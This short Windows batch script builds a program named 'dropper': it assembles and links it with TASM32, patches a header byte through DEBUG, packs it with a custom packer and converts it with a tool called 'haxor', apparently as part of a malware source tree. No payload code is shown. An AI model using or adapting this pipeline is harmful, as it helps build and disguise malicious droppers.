@echo off
%tasm32%tasm32.exe /ml /m /z dropper.asm,dropper.obj
%tasm32%tlink32.exe -x -c -Tpe dropper.obj,,,%tasm32%import32.lib
del dropper.obj

ren dropper.exe ttt
echo e 12 01 >$$$
echo q >>$$$
debug ttt <$$$
del $$$
ren ttt dropper.exe

..\..\..\SYSTEM\PACKER\packer c dropper.exe
..\..\..\SYSTEM\HAXOR\haxor dropper.exe dropper.asi /asm @dropper1
del dropper.exe
